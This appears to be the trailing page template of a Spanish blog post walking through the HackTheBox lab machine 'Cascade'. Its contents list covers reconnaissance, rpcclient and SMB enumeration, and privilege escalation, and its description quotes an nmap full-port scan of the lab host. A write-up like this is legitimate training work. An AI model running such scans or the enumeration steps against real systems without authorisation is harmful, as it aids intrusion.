        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar">
        <div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#reconocimiento">Reconocimiento</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
      </ul>
    </li>
    <li><a href="#enumeración">Enumeración</a>
      <ul>
        <li><a href="#rpcclient">rpcclient</a></li>
        <li><a href="#smb">SMB</a></li>
      </ul>
    </li>
    <li><a href="#escalada-de-privilegios">Escalada de Privilegios</a></li>
  </ul>
</nav>
  </div>
</div>
      </div>
      <div class="sidebar-common-sidebar hidden">
        
<div class="sidebar-author">
  <img
    data-src="/avatar/avatar.webp"
    data-sizes="auto"
    alt="Fouen"
    class="lazyload"
  />
  <div class="sidebar-author-name">Fouen</div>
  <div class="sidebar-description">Web enjoyer</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    
    <div class="sidebar-state-number">11</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">
      3
    </div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">9</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-github sidebar-social-icon">
      <a
        href="https://github.com/FOUEN"
        itemprop="url"
        target="_blank"
        aria-label="github"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
    <div class="icon-linkedin sidebar-social-icon">
      <a
        href="https://www.linkedin.com/in/joel-guill%c3%a9n-5a2531254"
        itemprop="url"
        target="_blank"
        aria-label="linkedin"
        rel="noopener external nofollow noreferrer"
      ></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe632;
        
      </div>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon '>
        
          &#xe62f;
        
      </div>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
</div>

      </div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
      <div class="site-search">
        <div class="reimu-popup popup">
          <div class="reimu-search">
            <div class="reimu-search-input-icon"></div>
            <div class="reimu-search-input" id="reimu-search-input"></div>
            <div class="popup-btn-close"></div>
          </div>
          <div class="reimu-results">
            <div id="reimu-stats"></div>
            <div id="reimu-hits"></div>
            <div id="reimu-pagination" class="reimu-pagination"></div>
          </div>
          <img class="reimu-bg" src="/images/reimu.png" />
        </div>
      </div>
    
    






  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    
    
    
    
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
  ></script>




  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    
    
    
    
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
  ></script>









  
      
      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
      



  





  
      
      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
      

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script>








  
      
      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
      



  <script>
    var ALGOLIA_CONFIG = {
      logo: '\/images\/algolia_logo.svg',
      algolia: {
        applicationID: "",
        apiKey: "",
        indexName: "",
        hits: {
          "per_page": parseInt("10")
        },
        labels: {
          "input_placeholder": ".....",
          "hits_empty": "No data for ${query}",
          "hits_stats": ""
        }
      }
    };
  </script>
  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
    defer
    
    
    
    integrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"
  ></script>


  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
    defer
    
    
    
    integrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"
  ></script>


  





  
      
      <script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
      











<div id="lazy-script">
  <div>
    
      
      
        
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Fouen",
          title: "Cascade",
          url: "https:\/\/fouen.github.io\/post\/hackthebox\/cascade\/",
          description: "\rReconocimiento\rNmap\rEscaneamos la maquina para ver que puertos tiene abiertos:\nnmap -p- --open -sS --min-rate 5000 -Pn -n 10.10.10.182 PORT STATE SERVICE\r53\/tcp open domain\r88\/tcp open kerberos-sec\r135\/tcp open msrpc\r139\/tcp open netbios-ssn\r389\/tcp open ldap\r445\/tcp open microsoft-ds\r636\/tcp open …",
          cover: "https:\/\/fouen.github.io\/images\/cascade.png",
        };
      </script>
    
    
    
      





  
      
      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
      

      
      
      
      
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;

        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      












      
    
    
  </div>
</div>






  





  
       
         
      

  





  
      
      <script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script>
      



<script>
  const reimuCopyright = String.raw`
   ______     ______     __     __    __     __  __    
  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                    
  `;
  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
  console.log(
    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
    "color: white; background: #ff5252; padding:5px 0;",
    "padding:4px;border:1px solid #ff5252;",
  );
</script>




  </body>
</html>
